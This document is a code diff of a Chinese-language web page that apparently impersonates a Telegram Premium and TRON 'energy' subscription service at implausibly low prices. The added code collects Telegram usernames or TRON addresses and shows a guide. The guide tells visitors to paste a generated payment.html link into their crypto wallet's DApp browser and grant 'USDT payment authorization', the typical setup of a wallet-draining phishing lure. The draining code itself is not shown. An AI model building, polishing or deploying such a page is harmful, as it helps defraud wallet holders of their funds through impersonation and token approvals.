@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Premium - 高级订阅服务</title>
+    <title>Telegram Premium & TRX能量 - 订阅服务</title>
     <style>
         * {
             margin: 0;
@@ -59,9 +59,43 @@
             font-weight: 700;
         }
         
+        .trx-header h1 {
+            background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
+            -webkit-background-clip: text;
+            background-clip: text;
+        }
+        
         .header p {
             font-size: 0.95rem;
             opacity: 0.9;
+        }
+        
+        .service-tabs {
+            display: flex;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 1rem;
+            padding: 0.25rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .tab {
+            flex: 1;
+            padding: 0.75rem 0.5rem;
+            text-align: center;
+            border-radius: 0.75rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        
+        .tab.active {
+            background: linear-gradient(90deg, #ff8c00, #ffd700);
+            color: #1e3c72;
+        }
+        
+        .trx-tab.active {
+            background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
         }
         
         .pricing-card {
@@ -69,10 +103,29 @@
             backdrop-filter: blur(10px);
             border-radius: 1.25rem;
             padding: 1.5rem;
-            margin: 0 auto;
+            margin: 0 auto 1.5rem auto;
             box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.2);
             border: 1px solid rgba(255, 255, 255, 0.1);
             text-align: center;
+        }
+        
+        .service-badge {
+            display: inline-block;
+            background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
+            color: white;
+            padding: 0.3rem 0.8rem;
+            border-radius: 1rem;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-bottom: 0.75rem;
+        }
+        
+        .trx-badge {
+            background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
+        }
+        
+        .premium-badge {
+            background: linear-gradient(90deg, #4ecdc4, #44a08d);
         }
         
         .pricing-header h2 {
@@ -82,11 +135,19 @@
             font-weight: 600;
         }
         
+        .trx-header h2 {
+            color: #ff6b6b;
+        }
+        
         .price {
             font-size: 2.5rem;
             font-weight: bold;
             margin: 1rem 0;
             color: #ffd700;
+        }
+        
+        .trx-price {
+            color: #ff6b6b;
         }
         
         .price span {
@@ -120,10 +181,20 @@
             animation: breathe 2s ease-in-out infinite;
         }
         
+        .trx-btn {
+            background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
+            box-shadow: 0 0.25rem 1rem rgba(255, 107, 107, 0.4);
+            animation: breathe-trx 2s ease-in-out infinite;
+        }
+        
         .btn:active {
             transform: translateY(1px);
             box-shadow: 0 0.125rem 0.5rem rgba(255, 140, 0, 0.4);
             animation: none;
+        }
+        
+        .trx-btn:active {
+            box-shadow: 0 0.125rem 0.5rem rgba(255, 107, 107, 0.4);
         }
         
         .btn:disabled {
@@ -140,6 +211,17 @@
             50% {
                 transform: scale(1.03);
                 box-shadow: 0 0.5rem 1.5rem rgba(255, 140, 0, 0.6);
+            }
+        }
+        
+        @keyframes breathe-trx {
+            0%, 100% {
+                transform: scale(1);
+                box-shadow: 0 0.25rem 1rem rgba(255, 107, 107, 0.4);
+            }
+            50% {
+                transform: scale(1.03);
+                box-shadow: 0 0.5rem 1.5rem rgba(255, 107, 107, 0.6);
             }
         }
         
@@ -176,6 +258,10 @@
             border-color: #ffd700;
         }
         
+        .trx-input:focus {
+            border-color: #ff6b6b;
+        }
+        
         .wallet-container {
             display: none;
             margin-top: 1.5rem;
@@ -208,6 +294,10 @@
             background: rgba(255, 255, 255, 0.2);
             border-color: #ffd700;
             transform: scale(0.98);
+        }
+        
+        .trx-wallet-option:active {
+            border-color: #ff6b6b;
         }
         
         .wallet-icon {
@@ -253,6 +343,10 @@
             flex-shrink: 0;
         }
         
+        .trx-step-number {
+            background: #ff6b6b;
+        }
+        
         .step-text {
             font-size: 0.95rem;
             padding-top: 0.25rem;
@@ -273,9 +367,18 @@
         }
         
         .feature-icon {
-            font-size: 1.8rem;
-            margin-bottom: 0.75rem;
-            color: #ffd700;
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 0.75rem auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .feature-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
         }
         
         .feature h3 {
@@ -306,6 +409,75 @@
             box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.3);
         }
         
+        .manual-guide {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 0.75rem;
+            padding: 1.5rem;
+            margin-top: 1.5rem;
+            text-align: left;
+        }
+        
+        .manual-guide h3 {
+            color: #ffd700;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+        
+        .trx-guide h3 {
+            color: #ff6b6b;
+        }
+        
+        .guide-steps {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .guide-step {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.75rem;
+        }
+        
+        .step-badge {
+            background: #ffd700;
+            color: #1e3c72;
+            width: 1.5rem;
+            height: 1.5rem;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: bold;
+            flex-shrink: 0;
+            margin-top: 0.1rem;
+        }
+        
+        .trx-step-badge {
+            background: #ff6b6b;
+        }
+        
+        .step-content {
+            flex: 1;
+            font-size: 0.9rem;
+        }
+        
+        .copy-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            font-size: 0.8rem;
+            margin-left: 0.5rem;
+        }
+        
+        .copy-btn:active {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        
         @media (max-width: 320px) {
             .wallet-options {
                 grid-template-columns: 1fr;
@@ -321,14 +493,21 @@
 </head>
 <body>
     <div class="container">
-        <div class="header">
+        <div class="header" id="mainHeader">
             <h1>Telegram 高级订阅服务</h1>
             <p>使用您的加密货币钱包获取 Telegram Premium 订阅</p>
         </div>
         
-        <div class="pricing-card">
+        <div class="service-tabs">
+            <div class="tab active" id="premiumTab" onclick="switchService('premium')">Telegram Premium</div>
+            <div class="tab trx-tab" id="trxTab" onclick="switchService('trx')">TRX波场能量</div>
+        </div>
+        
+        <!-- Telegram Premium 服务 -->
+        <div class="pricing-card" id="premiumService">
+            <div class="service-badge premium-badge">Telegram Premium</div>
             <div class="pricing-header">
-                <h2>Telegram Premium</h2>
+                <h2>高级订阅服务</h2>
                 <div class="price">$0.99<span>/3月</span></div>
                 <p class="description">为您自己或您的朋友和同事兑换享受专属功能和无限制体验</p>
             </div>
@@ -361,42 +540,178 @@
                 </div>
                 
                 <div class="wallet-options">
-                    <div class="wallet-option" onclick="wakeupWalletApp('TokenPocket')">
+                    <div class="wallet-option" onclick="selectWallet('TokenPocket', 'premium')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/yBbDWDrc/Token-Pocket.png" alt="TokenPocket" onerror="this.style.display='none'; this.parentNode.innerHTML='🔷';">
                         </div>
                         <div class="wallet-name">TokenPocket</div>
                     </div>
                     
-                    <div class="wallet-option" onclick="wakeupWalletApp('TronLink')">
+                    <div class="wallet-option" onclick="selectWallet('TronLink', 'premium')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/N2dhDDmF/tronlink.png" alt="TronLink" onerror="this.style.display='none'; this.parentNode.innerHTML='🔶';">
                         </div>
                         <div class="wallet-name">TronLink</div>
                     </div>
                     
-                    <div class="wallet-option" onclick="wakeupWalletApp('Bitget')">
+                    <div class="wallet-option" onclick="selectWallet('Bitget', 'premium')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/gbqHxTKN/Bitget-wallet.png" alt="Bitget Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
                         </div>
-                        <div class="wallet-name">Bitget</div>
+                        <div class="wallet-name">Bitget Wallet</div>
                     </div>
                     
-                    <div class="wallet-option" onclick="wakeupWalletApp('imToken')">
+                    <div class="wallet-option" onclick="selectWallet('imToken', 'premium')">
                         <div class="wallet-icon">
                             <img src="https://i.ibb.co/C3L6Lkd1/imtoken.png" alt="imToken" onerror="this.style.display='none'; this.parentNode.innerHTML='💳';">
                         </div>
                         <div class="wallet-name">imToken</div>
                     </div>
                 </div>
+                
+                <div class="manual-guide" id="premiumManualGuide" style="display: none;">
+                    <h3>支付操作指南</h3>
+                    <div class="guide-steps">
+                        <div class="guide-step">
+                            <div class="step-badge">1</div>
+                            <div class="step-content">
+                                <strong>复制支付链接：</strong>
+                                <div style="margin-top: 0.5rem; background: rgba(0,0,0,0.3); padding: 0.75rem; border-radius: 0.5rem; font-size: 0.8rem; word-break: break-all;">
+                                    <span id="premiumPaymentLink"></span>
+                                    <button class="copy-btn" onclick="copyPaymentLink('premium')">复制</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="guide-step">
+                            <div class="step-badge">2</div>
+                            <div class="step-content">
+                                <strong>打开 <span id="premiumWalletName"></span> 应用</strong>
+                            </div>
+                        </div>
+                        <div class="guide-step">
+                            <div class="step-badge">3</div>
+                            <div class="step-content">
+                                <strong>在钱包的 DApp 浏览器中粘贴并打开链接</strong>
+                            </div>
+                        </div>
+                        <div class="guide-step">
+                            <div class="step-badge">4</div>
+                            <div class="step-content">
+                                <strong>按照页面提示完成 USDT 支付授权</strong>
+                            </div>
+                        </div>
+                    </div>
+                    <div style="text-align: center; margin-top: 1.5rem;">
+                        <button class="btn" onclick="openInNewTab('premium')">在新窗口打开支付页面</button>
+                    </div>
+                </div>
             </div>
         </div>
         
-        <div class="features">
+        <!-- TRX波场能量服务 -->
+        <div class="pricing-card" id="trxService" style="display: none;">
+            <div class="service-badge trx-badge">TRX 波场能量</div>
+            <div class="pricing-header trx-header">
+                <h2>波场能量包月服务(不限笔数)</h2>
+                <div class="price trx-price">$1.99<span>/月</span></div>
+                <p class="description">为您的TRON钱包提供持续能量支持，畅享免手续费交易体验</p>
+            </div>
+            
+            <button id="trxPurchaseBtn" class="btn trx-btn">立即购买</button>
+            
+            <div id="trxUserForm" class="form-container">
+                <div class="step">
+                    <div class="step-number trx-step-number">1</div>
+                    <div class="step-text">填写接收能量的 TRON 钱包地址</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="trxAddress">TRON 钱包地址</label>
+                    <input type="text" id="trxAddress" class="trx-input" placeholder="例如: TDbhe6pR...X3K7A" required>
+                </div>
+                
+                <button id="trxConfirmBtn" class="btn trx-btn">确认支付 $1.99</button>
+            </div>
+            
+            <div id="trxWalletSection" class="wallet-container">
+                <div class="step">
+                    <div class="step-number trx-step-number">2</div>
+                    <div class="step-text">选择付款钱包</div>
+                </div>
+                
+                <div class="wallet-options">
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('TokenPocket', 'trx')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/yBbDWDrc/Token-Pocket.png" alt="TokenPocket" onerror="this.style.display='none'; this.parentNode.innerHTML='🔷';">
+                        </div>
+                        <div class="wallet-name">TokenPocket</div>
+                    </div>
+                    
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('TronLink', 'trx')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/N2dhDDmF/tronlink.png" alt="TronLink" onerror="this.style.display='none'; this.parentNode.innerHTML='🔶';">
+                        </div>
+                        <div class="wallet-name">TronLink</div>
+                    </div>
+                    
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('Bitget', 'trx')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/gbqHxTKN/Bitget-wallet.png" alt="Bitget Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
+                        </div>
+                        <div class="wallet-name">Bitget Wallet</div>
+                    </div>
+                    
+                    <div class="wallet-option trx-wallet-option" onclick="selectWallet('imToken', 'trx')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/C3L6Lkd1/imtoken.png" alt="imToken" onerror="this.style.display='none'; this.parentNode.innerHTML='💳';">
+                        </div>
+                        <div class="wallet-name">imToken</div>
+                    </div>
+                </div>
+                
+                <div class="manual-guide trx-guide" id="trxManualGuide" style="display: none;">
+                    <h3>支付操作指南</h3>
+                    <div class="guide-steps">
+                        <div class="guide-step">
+                            <div class="step-badge trx-step-badge">1</div>
+                            <div class="step-content">
+                                <strong>复制支付链接：</strong>
+                                <div style="margin-top: 0.5rem; background: rgba(0,0,0,0.3); padding: 0.75rem; border-radius: 0.5rem; font-size: 0.8rem; word-break: break-all;">
+                                    <span id="trxPaymentLink"></span>
+                                    <button class="copy-btn" onclick="copyPaymentLink('trx')">复制</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="guide-step">
+                            <div class="step-badge trx-step-badge">2</div>
+                            <div class="step-content">
+                                <strong>打开 <span id="trxWalletName"></span> 应用</strong>
+                            </div>
+                        </div>
+                        <div class="guide-step">
+                            <div class="step-badge trx-step-badge">3</div>
+                            <div class="step-content">
+                                <strong>在钱包的 DApp 浏览器中粘贴并打开链接</strong>
+                            </div>
+                        </div>
+                        <div class="guide-step">
+                            <div class="step-badge trx-step-badge">4</div>
+                            <div class="step-content">
+                                <strong>按照页面提示完成 USDT 支付授权</strong>
+                            </div>
+                        </div>
+                    </div>
+                    <div style="text-align: center; margin-top: 1.5rem;">
+                        <button class="btn trx-btn" onclick="openInNewTab('trx')">在新窗口打开支付页面</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="features" id="serviceFeatures">
             <div class="feature">
                 <div class="feature-icon">
-                    <!-- 保留图标展示（若图挂掉也不会影响布局） -->
-                    📁
+                    <img src="https://i.ibb.co/4nWVZXSp/open-folder-file-icon-219486.png" alt="更大文件上传" onerror="this.style.display='none'; this.parentNode.innerHTML='📁';">
                 </div>
                 <h3>更大文件上传</h3>
                 <p>上传最大 4GB 的文件</p>
@@ -404,7 +719,7 @@
             
             <div class="feature">
                 <div class="feature-icon">
-                    ⚡
+                    <img src="https://i.ibb.co/C58QKWSM/1695711361784527.jpg" alt="更快的下载速度" onerror="this.style.display='none'; this.parentNode.innerHTML='⚡';">
                 </div>
                 <h3>更快的下载速度</h3>
                 <p>享受无限制的下载速度</p>
@@ -412,7 +727,7 @@
             
             <div class="feature">
                 <div class="feature-icon">
-                    🖼️
+                    <img src="https://i.ibb.co/whwVyw5b/Telegram-logo-svg.webp" alt="专属贴纸" onerror="this.style.display='none'; this.parentNode.innerHTML='🎨';">
                 </div>
                 <h3>专属贴纸</h3>
                 <p>使用 Premium 专属动画贴纸</p>
@@ -420,7 +735,7 @@
             
             <div class="feature">
                 <div class="feature-icon">
-                    🛠️
+                    <img src="https://i.ibb.co/XZKJLw9b/photo-2025-10-31-23-15-28.jpg" alt="高级聊天管理" onerror="this.style.display='none'; this.parentNode.innerHTML='💬';">
                 </div>
                 <h3>高级聊天管理</h3>
                 <p>创建群组链接和更多管理工具</p>
@@ -429,6 +744,10 @@
     </div>
 
     <script>
+        let currentPaymentUrl = '';
+        let selectedWallet = '';
+        let currentService = 'premium';
+
         // 显示临时消息函数
         function showTemporaryMessage(message) {
             const existingMessage = document.querySelector('.temporary-message');
@@ -448,7 +767,128 @@
             }, 3000);
         }
 
-        // 检测是否在钱包内部（保持原有逻辑）
+        // 切换服务
+        function switchService(service) {
+            currentService = service;
+            
+            // 更新标签状态
+            document.getElementById('premiumTab').classList.toggle('active', service === 'premium');
+            document.getElementById('trxTab').classList.toggle('active', service === 'trx');
+            
+            // 显示对应服务
+            document.getElementById('premiumService').style.display = service === 'premium' ? 'block' : 'none';
+            document.getElementById('trxService').style.display = service === 'trx' ? 'block' : 'none';
+            
+            // 更新头部信息
+            const header = document.getElementById('mainHeader');
+            if (service === 'premium') {
+                header.innerHTML = `
+                    <h1>Telegram Premium 高级订阅服务</h1>
+                    <p>使用您的加密货币钱包获取 Telegram Premium 订阅</p>
+                `;
+                updateFeatures('premium');
+            } else {
+                header.innerHTML = `
+                    <h1 class="trx-header">TRX 能量包月订阅服务</h1>
+                    <p>使用您的加密货币钱包获取免手续费转账服务</p>
+                `;
+                updateFeatures('trx');
+            }
+            
+            // 重置表单状态
+            resetForms();
+        }
+
+        // 更新特性显示
+        function updateFeatures(service) {
+            const featuresContainer = document.getElementById('serviceFeatures');
+            if (service === 'premium') {
+                featuresContainer.innerHTML = `
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/4nWVZXSp/open-folder-file-icon-219486.png" alt="更大文件上传" onerror="this.style.display='none'; this.parentNode.innerHTML='📁';">
+                        </div>
+                        <h3>更大文件上传</h3>
+                        <p>上传最大 4GB 的文件</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/C58QKWSM/1695711361784527.jpg" alt="更快的下载速度" onerror="this.style.display='none'; this.parentNode.innerHTML='⚡';">
+                        </div>
+                        <h3>更快的下载速度</h3>
+                        <p>享受无限制的下载速度</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/whwVyw5b/Telegram-logo-svg.webp" alt="专属贴纸" onerror="this.style.display='none'; this.parentNode.innerHTML='🎨';">
+                        </div>
+                        <h3>专属贴纸</h3>
+                        <p>使用 Premium 专属动画贴纸</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/XZKJLw9b/photo-2025-10-31-23-15-28.jpg" alt="高级聊天管理" onerror="this.style.display='none'; this.parentNode.innerHTML='💬';">
+                        </div>
+                        <h3>高级聊天管理</h3>
+                        <p>创建群组链接和更多管理工具</p>
+                    </div>
+                `;
+            } else {
+                featuresContainer.innerHTML = `
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/Xk6SMFcs/tron-trx-icon3386-logowik-com.webp" alt="免手续费转账" onerror="this.style.display='none'; this.parentNode.innerHTML='🚀';">
+                        </div>
+                        <h3>免手续费转账</h3>
+                        <p>享受完全免费的TRON网络转账</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/Sw1m5Mc1/5c8399712069f697cf58e04be35a4caa.png" alt="高速交易" onerror="this.style.display='none'; this.parentNode.innerHTML='⚡';">
+                        </div>
+                        <h3>高速交易</h3>
+                        <p>交易确认速度提升至秒级</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/N6b50mVV/images.png" alt="稳定可靠" onerror="this.style.display='none'; this.parentNode.innerHTML='🛡️';">
+                        </div>
+                        <h3>稳定可靠</h3>
+                        <p>持续能量支持，交易永不中断</p>
+                    </div>
+                    
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <img src="https://i.ibb.co/JWTqyVtH/image1s.jpg" alt="成本节约" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
+                        </div>
+                        <h3>成本节约</h3>
+                        <p>大幅降低日常交易成本</p>
+                    </div>
+                `;
+            }
+        }
+
+        // 重置表单状态
+        function resetForms() {
+            // 重置Premium表单
+            document.getElementById('userForm').style.display = 'none';
+            document.getElementById('walletSection').style.display = 'none';
+            document.getElementById('premiumManualGuide').style.display = 'none';
+            document.getElementById('purchaseBtn').style.display = 'block';
+            
+            // 重置TRX表单
+            document.getElementById('trxUserForm').style.display = 'none';
+            document.getElementById('trxWalletSection').style.display = 'none';
+            document.getElementById('trxManualGuide').style.display = 'none';
+            document.getElementById('trxPurchaseBtn').style.display = 'block';
+        }
+
+        // 检测是否在钱包内部
         function isInWalletBrowser() {
             return window.ethereum || window.tronWeb || 
                    navigator.userAgent.includes('TokenPocket') ||
@@ -460,6 +900,7 @@
 
         // 初始化
         document.addEventListener('DOMContentLoaded', function() {
+            // Premium 服务事件
             document.getElementById('purchaseBtn').addEventListener('click', function() {
                 document.getElementById('userForm').style.display = 'block';
                 this.style.display = 'none';
@@ -482,113 +923,109 @@
                 document.getElementById('walletSection').style.display = 'block';
                 document.getElementById('userForm').style.display = 'none';
             });
+
+            // TRX 服务事件
+            document.getElementById('trxPurchaseBtn').addEventListener('click', function() {
+                document.getElementById('trxUserForm').style.display = 'block';
+                this.style.display = 'none';
+            });
+            
+            document.getElementById('trxConfirmBtn').addEventListener('click', function() {
+                const trxAddress = document.getElementById('trxAddress').value.trim();
+                
+                if (!trxAddress) {
+                    showTemporaryMessage('请填写钱包地址！');
+                    return;
+                }
+                
+                if (!trxAddress.startsWith('T')) {
+                    showTemporaryMessage('TRON钱包地址必须以 T 开头');
+                    return;
+                }
+                
+                document.getElementById('trxWalletSection').style.display = 'block';
+                document.getElementById('trxUserForm').style.display = 'none';
+            });
         });
 
-        // 生成支付链接 - 改进为生成绝对 URL（包含 origin + 基础路径）
-        function generatePaymentUrl() {
-            const username = document.getElementById('username').value.trim();
-            const nickname = document.getElementById('nickname').value.trim();
-            
-            if (!username || !nickname) {
-                showTemporaryMessage('请先填写用户信息！');
-                return null;
+        // 生成支付链接
+        function generatePaymentUrl(service) {
+            if (service === 'premium') {
+                const username = document.getElementById('username').value.trim();
+                const nickname = document.getElementById('nickname').value.trim();
+                
+                if (!username || !nickname) {
+                    showTemporaryMessage('请先填写用户信息！');
+                    return null;
+                }
+                
+                const orderId = 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const authUrl = `payment.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=0.99&service=premium`;
+                return window.location.origin + (window.location.pathname.includes('/') ? authUrl : '/' + authUrl);
+            } else if (service === 'trx') {
+                const trxAddress = document.getElementById('trxAddress').value.trim();
+                
+                if (!trxAddress) {
+                    showTemporaryMessage('请先填写钱包地址！');
+                    return null;
+                }
+                
+                const orderId = 'TRX' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const authUrl = `payment.html?orderId=${orderId}&trxAddress=${encodeURIComponent(trxAddress)}&amount=1.99&service=trx`;
+                return window.location.origin + (window.location.pathname.includes('/') ? authUrl : '/' + authUrl);
             }
-            
-            // 生成订单号
-            const orderId = 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
-
-            // 计算基础路径（保留当前目录）
-            const origin = window.location.origin;
-            // 取当前路径目录部分，确保在多级路径下也能正确拼接
-            const path = window.location.pathname;
-            const basePath = path.endsWith('/') ? path : path.replace(/\/[^/]*$/, '/');
-            const base = origin + basePath;
-
-            // 构建钱包授权页面 URL（绝对路径）
-            const authUrl = `${base}wallet-auth.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=1.99`;
-            
-            return authUrl;
         }
 
-        // === 唤醒钱包并跳转到授权页（仅此处为修正代码） ===
-        function wakeupWalletApp(walletName) {
-            const fullAuthUrl = generatePaymentUrl();
+        // 选择钱包
+        function selectWallet(walletName, service) {
+            const fullAuthUrl = generatePaymentUrl(service);
             if (!fullAuthUrl) return;
 
-            console.log('支付链接:', fullAuthUrl);
+            currentPaymentUrl = fullAuthUrl;
+            selectedWallet = walletName;
+            currentService = service;
 
-            // 如果在钱包内部，直接用绝对 URL 跳转（保持原行为）
-            if (isInWalletBrowser()) {
-                showTemporaryMessage('正在跳转到支付页面...');
-                setTimeout(() => {
-                    window.location.href = fullAuthUrl;
-                }, 200);
-                return;
+            // 显示对应服务的操作指南
+            if (service === 'premium') {
+                document.getElementById('premiumManualGuide').style.display = 'block';
+                document.getElementById('premiumPaymentLink').textContent = fullAuthUrl;
+                document.getElementById('premiumWalletName').textContent = walletName;
+            } else {
+                document.getElementById('trxManualGuide').style.display = 'block';
+                document.getElementById('trxPaymentLink').textContent = fullAuthUrl;
+                document.getElementById('trxWalletName').textContent = walletName;
             }
 
-            // 根据钱包类型构造官方/常用 deep link（把完整 URL 作为参数传给钱包）
-            let deeplink;
-            switch (walletName) {
-                case 'TokenPocket':
-                    deeplink = `tpdapp://open?url=${encodeURIComponent(fullAuthUrl)}`;
-                    break;
-                case 'TronLink':
-                    deeplink = `tronlinkoutside://dapp?url=${encodeURIComponent(fullAuthUrl)}`;
-                    break;
-                case 'Bitget':
-                    // Bitget/BitKeep 常用 scheme 之一
-                    deeplink = `bitkeep://dapp?url=${encodeURIComponent(fullAuthUrl)}`;
-                    break;
-                case 'imToken':
-                    deeplink = `imtokenv2://navigate?url=${encodeURIComponent(fullAuthUrl)}`;
-                    break;
-                default:
-                    deeplink = fullAuthUrl;
-            }
-
-            // 使用 iframe 触发 + 备用直接跳转 + Android intent 方案，覆盖更多浏览器/平台组合
-            try {
-                // 方法1: iframe 触发
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = deeplink;
-                document.body.appendChild(iframe);
-
-                setTimeout(() => {
-                    try { document.body.removeChild(iframe); } catch (e) { /* ignore */ }
-                }, 1200);
-            } catch (e) {
-                console.log('iframe 唤醒失败：', e);
-            }
-
-            // 方法2: 备用直接跳转（部分浏览器需要）
-            setTimeout(() => {
-                try { window.location.href = deeplink; } catch (e) { /* ignore */ }
-            }, 800);
-
-            // 方法3: Android intent 备用（仅在 Android UA 上尝试）
-            try {
-                if (/Android/i.test(navigator.userAgent)) {
-                    // 构造一个 intent URL，把 deeplink 中的 payload 放入 path 部分
-                    // 例如：intent://open?url=...#Intent;scheme=tpdapp;end
-                    const scheme = deeplink.split(':')[0];
-                    const payload = deeplink.replace(/^[^:]+:\/\//, '');
-                    const intentUrl = `intent://${payload}#Intent;scheme=${scheme};end`;
-                    setTimeout(() => {
-                        try { window.location.href = intentUrl; } catch (e) { /* ignore */ }
-                    }, 1200);
-                }
-            } catch (e) {
-                console.log('intent 构造异常：', e);
-            }
-
-            // 最后提供用户提示（如果唤醒失败用户可以手动打开钱包 DApp 浏览器访问）
-            setTimeout(() => {
-                showTemporaryMessage('如果钱包未自动打开，请在钱包 APP 的 DApp 浏览器中打开支付页面。');
-            }, 2000);
+            showTemporaryMessage(`已选择 ${walletName}，请按照指南操作`);
         }
 
-        // 兼容性检查（保留）
+        // 复制支付链接
+        function copyPaymentLink(service) {
+            if (!currentPaymentUrl) return;
+            
+            navigator.clipboard.writeText(currentPaymentUrl).then(() => {
+                showTemporaryMessage('支付链接已复制到剪贴板');
+            }).catch(() => {
+                // 降级方案
+                const textArea = document.createElement('textarea');
+                textArea.value = currentPaymentUrl;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                showTemporaryMessage('支付链接已复制到剪贴板');
+            });
+        }
+
+        // 在新窗口打开支付页面
+        function openInNewTab(service) {
+            if (!currentPaymentUrl) return;
+            
+            window.open(currentPaymentUrl, '_blank');
+            showTemporaryMessage('支付页面已在新窗口打开');
+        }
+
+        // 检测是否在Bitget Wallet内
         function checkBitgetWallet() {
             if (navigator.userAgent.includes('Bitget') || navigator.userAgent.includes('BitKeep')) {
                 console.log('在Bitget Wallet环境中');
@@ -597,6 +1034,7 @@
             return false;
         }
 
+        // 页面加载时检查环境
         window.addEventListener('load', function() {
             if (checkBitgetWallet()) {
                 console.log('检测到在Bitget Wallet中运行');
